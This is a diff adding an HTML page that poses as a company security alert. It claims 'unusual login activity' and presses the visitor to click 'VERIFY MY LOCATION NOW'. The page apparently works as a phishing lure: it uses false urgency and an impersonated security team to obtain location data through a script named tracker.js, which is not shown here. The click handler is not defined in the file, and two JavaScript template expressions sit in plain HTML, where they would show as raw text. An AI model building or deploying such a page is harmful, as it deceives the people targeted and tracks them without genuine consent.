@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Verification Required - Company Portal</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .header {
+      background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+
+    .alert-banner {
+      background: #fff3cd;
+      border: 1px solid #ffeaa7;
+      border-left: 5px solid #fdcb6e;
+      padding: 20px;
+      margin: 20px;
+      border-radius: 5px;
+    }
+
+    .content { padding: 30px; }
+
+    .verification-box {
+      border: 2px solid #e9ecef;
+      border-radius: 8px;
+      padding: 25px;
+      margin: 20px 0;
+      text-align: center;
+      position: relative;
+    }
+
+    /* Button styling */
+    .btn-verify {
+      background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 18px;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-weight: bold;
+      margin: 20px 0;
+      position: relative;
+      overflow: visible;
+    }
+
+    .btn-verify:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(116, 185, 255, 0.4);
+    }
+
+    .status { padding: 15px; margin: 10px 0; border-radius: 5px; text-align: center; min-height: 64px; }
+
+    .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
+    .error   { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
+
+    .footer { text-align: center; padding: 20px; color: #6c757d; font-size: 14px; }
+
+    .incident-id {
+      background: rgba(255,255,255,0.2);
+      padding: 10px;
+      border-radius: 5px;
+      margin: 10px 0;
+      font-family: monospace;
+    }
+
+    /* SVG verify animation styles */
+    .verify-animation { display: inline-block; position: relative; }
+
+    .verify-svg {
+      width: 44px;
+      height: 44px;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%) scale(0.9);
+      pointer-events: none;
+      opacity: 0; /* hidden until success */
+      transition: opacity 180ms ease, transform 250ms ease;
+    }
+
+    .check-circle {
+      fill: none;
+      stroke: #2ecc71;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      stroke-dasharray: 160;
+      stroke-dashoffset: 160;
+      transition: stroke-dashoffset 0.6s cubic-bezier(.2,.9,.2,1);
+    }
+
+    .check-mark {
+      fill: none;
+      stroke: #2ecc71;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      stroke-dasharray: 40;
+      stroke-dashoffset: 40;
+      transition: stroke-dashoffset 0.35s ease 0.55s;
+    }
+
+    /* When the button gets .verifying (optional) we can show a small spinner - visual feedback while checking */
+    .btn-verify.verifying {
+      filter: brightness(0.95);
+    }
+
+    .btn-verify.verified .verify-svg {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .btn-verify.verified .check-circle {
+      stroke-dashoffset: 0;
+    }
+
+    .btn-verify.verified .check-mark {
+      stroke-dashoffset: 0;
+    }
+
+    /* small text fade when verified (optional) */
+    .btn-verify .btn-text {
+      transition: opacity 200ms ease;
+    }
+    .btn-verify.verified .btn-text {
+      opacity: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🔒 SECURITY INCIDENT DETECTED</h1>
+      <p>Company Security System - Immediate Action Required</p>
+    </div>
+
+    <div class="alert-banner">
+      <h3>⚠️ Unusual Login Activity Detected</h3>
+      <p>Multiple unauthorized access attempts from suspicious locations have been detected on your account.</p>
+    </div>
+
+    <div class="content">
+      <div class="incident-id">
+        <strong>Incident ID:</strong> SEC-${Math.random().toString(36).substr(2, 8).toUpperCase()}
+        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+      </div>
+
+      <div class="verification-box">
+        <h2>Location Verification Required</h2>
+        <p>To secure your account and prevent unauthorized access, we need to verify your current location.</p>
+        <p><em>This verification helps us ensure that only authorized personnel can access company resources.</em></p>
+
+        <!-- Updated button: uses handleVerifyClick and includes the SVG for the check (hidden until success) -->
+        <button class="btn-verify verify-animation" id="verifyBtn" onclick="handleVerifyClick()">
+          <span class="btn-text">🔍 VERIFY MY LOCATION NOW</span>
+
+          <!-- SVG check (hidden by default; animates when .verified class is added) -->
+          <svg class="verify-svg" viewBox="0 0 52 52" aria-hidden="true" focusable="false">
+            <circle class="check-circle" cx="26" cy="26" r="24" />
+            <path class="check-mark" d="M14 27l7 7 16-16" />
+          </svg>
+        </button>
+
+        <div id="status" class="status"></div>
+      </div>
+
+      <div class="footer">
+        <p>© 2025 Company Security Team. All rights reserved.</p>
+        <p>If you did not attempt to access your account recently, please contact IT support immediately.</p>
+      </div>
+    </div>
+  </div>
+
+  <script src="tracker.js"></script>
+</body>
+</html>
